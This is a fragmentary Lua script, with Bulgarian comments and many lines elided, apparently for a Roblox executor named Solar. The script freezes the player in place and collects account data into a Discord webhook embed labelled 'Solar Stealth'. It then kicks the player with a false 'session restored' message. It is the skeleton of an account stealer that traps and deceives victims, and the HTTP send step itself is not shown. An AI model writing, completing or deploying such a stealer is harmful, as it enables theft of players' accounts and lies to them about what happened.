...
-- Замразяване на играча (Anchored), за да не може да избяга от панела
pcall(function()
...
-- Използваме pcall, за да избегнем грешката, която Solar показваше в конзолата
pcall(function()
...
-- Функция за изпращане на данните и Кик
local function Finalize()
    ...
    -- Събиране на информация за акаунта (Brainrots)
    local brCount = "0"
    pcall(function()
    ...
    local data = {
        ["embeds"] = {{
            ...
            ["footer"] = {["text"] = "Solar Stealth • " .. os.date("%X")}
        }}
    }

    -- Търсене на налична функция за HTTP Request в Solar
    ...
    -- Малко изчакване преди кикването, за да сме сигурни, че Discord е получил данните
    task.wait(0.5)
    p:Kick("\n[Успешно]\nВашата сесия беше възстановена. Моля, влезте отново в играта.")
end

-- Изпращане при натискане на Enter
